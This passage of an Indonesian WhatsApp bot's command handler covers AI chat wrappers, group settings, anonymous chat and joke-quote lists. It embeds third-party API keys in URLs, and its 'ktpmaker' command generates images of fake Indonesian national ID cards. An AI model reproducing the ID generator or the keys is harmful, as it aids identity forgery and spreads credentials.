case 'anyeong': { 
  reply('nee anyeong chinguyaa')
}
break
case 'bot': {
  reply('Dzsya Botz aktif kak')
}
break

case 'p': {
  reply('gak punya agama ya')
}
break
//==================================================================
case 'aivo': {
  if (!text) return replygcxeon(`Example : ${command} siapa jokowi`);
  reply(mess.wait)
  let data = await fetchJson(`https://kiicodeofficial.my.id/api/ai/bard2?query=${text}&apikey=Dzsyacans`);
      if (data.data && data.data.result) {
    const videoCaption = data.data.result
  .replace(/\\n/g, '\n')
  .replace(/\\/g, '')
  .replace(/\n/g, '')
  .replace(/\nn/g, '')
  .replace(/\*/g, '');
      XeonBotInc.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/gtts/id?apikey=Akiraa&text=${videoCaption}` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
    }
}
  break;

//==================================================================
case 'bard': {
if (!text) return replygcxeon(`Example : ${command} siapakah elon musk`)
reply(mess.wait)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/ai/bard2?query=${text}&apikey=Dzsyacans`);
      if (data.data && data.data.result) {
    const videoCaption = data.data.result
  .replace(/\\n/g, '\n')
  .replace(/\\/g, '')
  .replace(/\n/g, '')
  .replace(/\nn/g, '')
  .replace(/\*/g, '');
    reply(`${videoCaption}`)
      }
}
  break
//==================================================================
case 'ai': case 'openai': {
  if (!text) return replygcxeon(`Example : ${command} siapakah elon musk`)
  reply(mess.wait)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/ai/bard2?query=${text}&apikey=Dzsyacans`);
      if (data.data && data.data.result) {
    const videoCaption = data.data.result
  reply(`${videoCaption}`)
}
}
break
//=========================================\\======
case 'blackboxai': {
if (!text) return replygcxeon(`Example : ${command} siapakah elon musk`)
  reply(mess.wait)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/ai/blackbox?q=${encodeURIComponent(text)}&apikey=Dzsyacans`);
if (data.data && data.data.response) {
  const aimsg = data.data.response;
  reply(`${aimsg}`)
}
}
break
//=========================================\\======
case 'cai': {
  if (!text) return replygcxeon(`Example : ${command} siapakah elon musk`)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/others/cai?q=${encodeURIComponent(text)}&text=Dani&apikey=Dzsyacans`);
if (data.data && data.data.output) {
  const caimsg = data.data.output;
  reply(`${caimsg}`)
}
}
break
//=========================================\\======
case 'gptimg':{
  if (!text) return reply('mau cara foto apa kak')
  reply(mess.wait)
  let gptgg = await fetchJson(`https://kiicodeofficial.my.id/api/ai/gptpicture?q=${text}&apikey=Dzsyacans`);
  const hasilnya = gptgg.data.data.imgs[0];
  XeonBotInc.sendMessage(m.chat, {image: {url: hasilnya }}, {quoted: m})
}
break
//=========================================\\======
case 'ttsai': {
  if (!q) return reply(`Masukan Text Nya!\n\nContoh\n${command} Blackpink`)
  let res = await fetchJson(`https://skizo.tech/api/tts-ai?text=${q}=Laila&apikey=dzsyabotz`);
  const audiobuf = res.base64
    let audioBuffer = Buffer.from(audiobuf, "base64");
XeonBotInc.sendMessage(m.chat, {audio: audioBuffer, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
  break;
//=========================================\\======
case'mute':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !XeonTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
//=========================================\\======
case'autoaigrup':case "aigrup": case'autoaigc':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !XeonTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return reply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return reply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Disabling Auto AI')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
//=========================================\\======
case'welcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !XeonTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return reply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return reply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses menonaktifkan welcome di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case'left': case 'goodbye':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !XeonTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return reply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
reply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return reply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
reply('Sukses menonaktifkan goodbye di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case'setwelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!XeonTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
reply(`Successfully set welcome!`)
break
case'changewelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!XeonTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
reply(`Sukses change set welcome teks!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
reply(`Sukses change set welcome teks!`)
}
break
case'delsetwelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!XeonTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!isSetWelcome(m.chat, set_welcome_db)) return reply(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
reply(`Sukses delete set welcome`)
break
case'setleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!XeonTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return reply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Successfully set left!`)
break
case'changeleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!XeonTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
reply(`Sukses change set left teks!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Sukses change set left teks!`)
}
break
case'delsetleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!XeonTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!isSetLeft(m.chat, set_left_db)) return reply(`Belum ada set left di sini..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
reply(`Sukses delete set left`)
break
//=========================================\\======

//=========================================\\======
case 'ktpmaker': {
if (args.length == 0) return reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc \n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
reply(mess.wait)
let get_args = args.join(" ").split("|")
let nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
let prov = get_args[1]
if (!prov) return m.reply('provinsi mana kak')
let kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
let name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
let ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
let jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
let jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
let rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
let lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
let camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
let agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
let nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
let kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
let warga = get_args[13]
if (!warga) return m.reply('region belum ada')
let until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
 XeonBotInc.sendMessage(m.chat, { image: {url: `https://api.lolhuman.xyz/api/ktpmaker?apikey=Akiraa&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=https://telegra.ph/file/2487220c98c7c4fb6f438.jpg`}, caption: 'nih ktp nya cok' }, { quoted: m })
}
break 
//=========================================\\======
case 'report': {
replygcxeon(` =====[ *DEVELOPER OF DASZYA BOT* ]===== 
• ᴊᴀɴɢᴀɴ ᴄʜᴀᴛ ꜱᴇᴍʙᴀʀᴀɴɢᴀɴ ᴋᴇ ɴᴏᴍᴏʀ ᴏᴡɴᴇʀ ᴍᴀᴋᴀ ᴀᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ ᴅɪ ʙʟᴏᴋɪʀ
• ᴊᴀɴɢᴀɴ ᴄᴀʟʟ/ᴛᴇʟᴇᴘᴏɴ ᴏᴡɴᴇʀ ᴛᴀɴᴘᴀ ɪᴢɪɴ • ᴄʜᴀᴛ ʟᴀɴɢꜱᴜɴɢ ᴋᴇ ɪɴᴛɪɴʏᴀ ᴀᴊᴀ , 
• https://wa.me/6285892928715?text=Lapor+min+fitur+ada+yang+eror+kalo+bisa+di+perbaiki.
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕",`)
}
break
//=========================================\\======
case'sendprofile': case'sendprofil':
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await XeonBotInc.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await XeonBotInc.sendContact(partnerJID, [m.sender.split("@")[0]])
XeonBotInc.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
XeonBotInc.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
//=========================================\\======
case 'mulai': case 'start': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
XeonBotInc.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await XeonBotInc.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
XeonBotInc.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
//=========================================\\======
case 'quotesanime':
case 'quotesanim': {
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
//=========================================\\======
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
